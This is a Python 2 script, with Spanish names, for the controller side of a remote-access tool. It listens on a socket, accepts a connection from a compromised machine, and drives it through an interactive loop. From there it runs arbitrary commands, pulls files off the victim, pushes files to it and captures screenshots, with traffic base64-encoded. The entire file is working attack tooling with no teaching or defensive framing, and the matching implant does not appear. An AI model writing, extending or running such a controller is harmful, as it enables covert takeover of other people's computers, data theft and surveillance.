#!/usr/bin/env python
#_*_ coding: utf8 _*_

import socket
import base64


def terminal():
	directorio = target.recv(1024)
	contador = 0
	while True:
		comando = raw_input("~{}$:".format(directorio))
		if comando == "exit" :
			target.send(comando)
			break
		elif comando[:2] == "cd":
			target.send(comando)
			res = target.recv(1024)
			directorio = res
		elif comando[:9] == "descargar":
			target.send(comando)
			with open(comando[10:], "wb") as ar_descargar:
				datos = target.recv(100000)
				ar_descargar.write(base64.b64decode(datos))
		elif comando[:4] == "sube":
			try:
				target.send(comando)
				with open(comando[5:], "rb") as subiendo:
					target.send(base64.b64encode(subiendo.read()))
			except:
				print("No se pudo subir el archivo")
		elif comando[:7] == "captura":
			target.send(comando)
			with open("captura-%d.png" % contador, "wr") as screen:
				datos = target.recv(1000000)
				decode_data = base64.b64decode(datos)
				if decode_data == "Error":
					print("No se tomo la captura de pantalla")
				else:
					screen.write(decode_data)
					print("Captura N#%d" % contador)
					contador = contador + 1 
		else:
			target.send(comando)
			res = target.recv(100000)
			if res == "1":
				continue
			else:
				print(res)

def inicio_server():
	global server
	global ip 
	global target

	server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	server.bind(('127.0.0.2', 2000))
	server.listen(1)
	print("Servidor Act Esperando Conexiones")

	target, ip = server.accept()
	print("Conexion Establecida de : " + str(ip[0]) )


inicio_server()
terminal()
server.close()